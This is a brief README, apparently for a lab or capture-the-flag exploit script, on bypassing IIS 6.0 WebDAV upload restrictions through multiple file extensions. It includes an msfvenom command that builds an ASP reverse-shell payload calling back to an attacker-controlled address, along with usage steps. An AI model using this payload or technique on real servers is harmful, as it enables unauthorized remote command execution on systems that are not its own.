# WebDAV Upload Bypass

Simple Script to exploit Webdav running on Microsoft IIS 6.0 incorrectly executing ASP code in files that have multiple file extensions. 

**TO USE:**

Generate msfvenom payload: e.g. msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=9999 -f asp > reverse.asp
  
Then run: ./script \<host\> \<filename\>
